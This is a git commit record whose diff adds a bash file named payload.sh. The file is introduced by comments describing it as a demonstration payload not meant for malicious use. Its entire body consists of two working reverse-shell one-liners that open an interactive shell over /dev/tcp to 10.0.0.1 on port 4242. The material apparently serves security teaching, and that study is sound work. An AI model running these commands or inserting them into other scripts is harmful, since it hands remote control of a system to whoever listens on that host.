3a5dc4249245ec83e4abc3f86df507776ff9cb27
Omar Santos <santosomar@gmail.com>
2021-03-28 20:34:49 -0400

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,1 +1,7 @@
+#!/bin/bash
+# This is an example payload
+# Do not use this for maliciuos intent
+# This is used for demonstration purposes
 
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
